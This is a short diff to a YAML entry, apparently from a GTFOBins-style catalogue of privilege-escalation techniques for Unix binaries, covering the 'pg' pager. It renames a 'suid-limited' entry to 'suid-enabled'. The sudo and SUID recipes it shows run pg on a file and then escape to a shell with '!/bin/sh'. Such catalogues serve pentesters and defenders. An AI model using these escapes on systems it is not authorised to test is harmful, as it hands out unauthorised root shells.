@@ -10,8 +10,9 @@ functions:
     - code: |
         sudo pg /etc/profile
         !/bin/sh
-  suid-limited:
-    - code: |
-        ./pg /etc/profile
+  suid-enabled:
+    - description:
+      code: |
+        ./pg file_to_read
         !/bin/sh
 ---
